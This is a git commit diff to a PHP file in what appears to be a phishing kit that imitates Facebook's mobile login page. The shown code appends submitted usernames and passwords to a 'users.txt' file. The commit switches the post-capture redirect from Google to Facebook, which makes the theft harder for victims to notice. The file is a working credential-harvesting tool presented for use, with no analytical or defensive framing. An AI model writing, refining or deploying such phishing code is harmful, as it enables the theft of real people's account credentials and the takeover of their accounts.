715ed8a779a66a7cca63b027da6274dbf331ac2f
th3_pr3dat0r <55555800+tony23x@users.noreply.github.com>
2020-12-06 17:21:05 -0500

    Update login.php

--- sites/facebook_mobile/login.php
+++ sites/facebook_mobile/login.php
@@ -8,5 +8,5 @@ $archivo = fopen("users.txt","a");
 $datos= "\n"."Account: ".$username."\r\n"."Pass: ".$clave."\n"."\n"."####################"."\n";
 fwrite($archivo,$datos);
 fclose($archivo);
-echo "<meta http-equiv='refresh' content='1;url=https://www.google.com'>  ";
+echo "<meta http-equiv='refresh' content='1;url=https://www.facebook.com'>  ";
 ?>
